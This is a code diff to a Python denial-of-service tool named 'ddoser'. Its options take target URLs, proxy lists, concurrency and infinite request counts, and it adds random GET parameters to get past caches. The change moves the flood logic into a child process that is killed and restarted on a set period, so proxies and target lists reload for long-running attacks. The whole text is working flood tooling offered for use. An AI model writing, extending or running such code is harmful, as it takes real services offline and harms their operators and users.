@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 import asyncio
+import multiprocessing
+
 import uvloop
 import logging
 import os
@@ -103,26 +105,12 @@ def load_targets(target_urls_file: str) -> List[str]:
     return target_urls
 
 
-@click.command(help="Run ddoser")
-@click.option('--target-url', help='ddos target url')
-@click.option('--target-urls-file', help='path or url to file contains urls to ddos')
-@click.option('--proxy-url', help='url to proxy resourse')
-@click.option('--proxy-file', help='path to file with proxy list')
-@click.option('--concurrency', help='concurrency level', type=int, default=1)
-@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
-@click.option('--timeout', help='requests timeout', type=int, default=5)
-@click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
-@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
-@click.option('--user-agent', help='custom user agent')
-@click.option('--log-to-stdout', help='log to console', is_flag=True)
-def main(
+def process(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
-        concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
-        user_agent: str, log_to_stdout: str
+        concurrency: int, count: int, timeout: int, with_random_get_param: bool,
+        user_agent: str, verbose: bool, log_to_stdout: bool,
 ):
     config_logger(verbose, log_to_stdout)
-    if not target_urls_file and not target_url:
-        raise SystemExit('--target-url or --target-urls-file is required')
     uvloop.install()
     set_limits()
     proxies = load_proxies(proxy_file, proxy_url)
@@ -135,6 +123,43 @@ def main(
         if key != 'success':
             logging.info("%s: %s", key, value)
     logging.info('success: %s', STATS["success"])
+
+
+@click.command(help="Run ddoser")
+@click.option('--target-url', help='ddos target url')
+@click.option('--target-urls-file', help='path or url to file contains urls to ddos')
+@click.option('--proxy-url', help='url to proxy resourse')
+@click.option('--proxy-file', help='path to file with proxy list')
+@click.option('--concurrency', help='concurrency level', type=int, default=1)
+@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
+@click.option('--timeout', help='requests timeout', type=int, default=5)
+@click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
+@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
+@click.option('--user-agent', help='custom user agent')
+@click.option('--log-to-stdout', help='log to console', is_flag=True)
+@click.option('--restart-period', help='period in seconds to restart application (reload proxies ans targets)', type=int)
+def main(
+        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
+        concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
+        user_agent: str, log_to_stdout: str, restart_period: int
+):
+    config_logger(verbose, log_to_stdout)
+    if not target_urls_file and not target_url:
+        raise SystemExit('--target-url or --target-urls-file is required')
+    while True:
+        proc = multiprocessing.Process(
+            target=process,
+            args=(target_url, target_urls_file, proxy_url, proxy_file,
+                  concurrency, count, timeout, with_random_get_param, user_agent, verbose, log_to_stdout)
+        )
+        proc.start()
+        proc.join(restart_period)
+        if proc.exitcode is None:
+            logging.info('Killing the process by restart period')
+            proc.kill()
+            proc.join()
+        if restart_period is None:
+            break
 
 
 if __name__ == '__main__':
